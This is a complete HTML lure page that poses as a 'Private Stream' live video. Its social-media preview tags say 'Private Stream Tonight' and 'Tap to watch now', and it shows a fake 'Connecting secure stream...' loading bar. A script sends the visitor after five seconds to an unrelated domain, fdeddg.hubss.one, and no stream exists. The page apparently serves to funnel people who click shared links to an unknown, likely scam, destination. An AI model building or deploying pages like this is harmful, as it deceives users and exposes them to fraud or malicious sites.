<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Private Stream</title>
<meta name="description" content="Watch live update now">

<!-- OG META -->
<meta property="og:type" content="website">
<meta property="og:title" content="🔴 Private Stream Tonight">
<meta property="og:description" content="Tap to watch now">
<meta property="og:image" content="https://lovegallery.online/preview.jpg">
<meta property="og:image:type" content="image/jpeg">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">

<!-- PRELOAD -->
<link rel="preload" as="image" href="/preview.jpg">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
}

body{
  background:#000;
  color:#fff;
  font-family:Arial, sans-serif;
  height:100vh;
  overflow:hidden;
}

.container{
  width:100%;
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  flex-direction:column;
  text-align:center;
  padding:20px;
}

.preview{
  width:100%;
  max-width:420px;
  border-radius:16px;
  overflow:hidden;
  box-shadow:0 0 25px rgba(255,255,255,0.15);
}

.preview img{
  width:100%;
  display:block;
}

.live{
  margin-top:18px;
  font-size:28px;
  font-weight:bold;
}

.dot{
  color:red;
  animation:blink 1s infinite;
}

@keyframes blink{
  50%{
    opacity:0.3;
  }
}

.loading-box{
  margin-top:18px;
  width:260px;
}

.loading-text{
  font-size:14px;
  margin-bottom:10px;
  color:#ccc;
}

.bar{
  width:100%;
  height:8px;
  background:#222;
  border-radius:10px;
  overflow:hidden;
}

.fill{
  height:100%;
  width:0%;
  background:red;
  animation:load 5s linear forwards;
}

@keyframes load{
  from{
    width:0%;
  }
  to{
    width:100%;
  }
}

.note{
  margin-top:15px;
  color:#999;
  font-size:13px;
}
</style>
</head>

<body>

<div class="container">

  <div class="preview">
    <img src="/preview.jpg" alt="Preview">
  </div>

  <div class="live">
    <span class="dot">●</span> LIVE LOADING...
  </div>

  <div class="loading-box">
    <div class="loading-text">
      Connecting secure stream...
    </div>

    <div class="bar">
      <div class="fill"></div>
    </div>
  </div>

  <div class="note">
    Please wait a moment...
  </div>

</div>

<script>
setTimeout(function(){
  window.location.href = "https://fdeddg.hubss.one/p/nhVNy";
}, 5000);
</script>

</body>
</html>
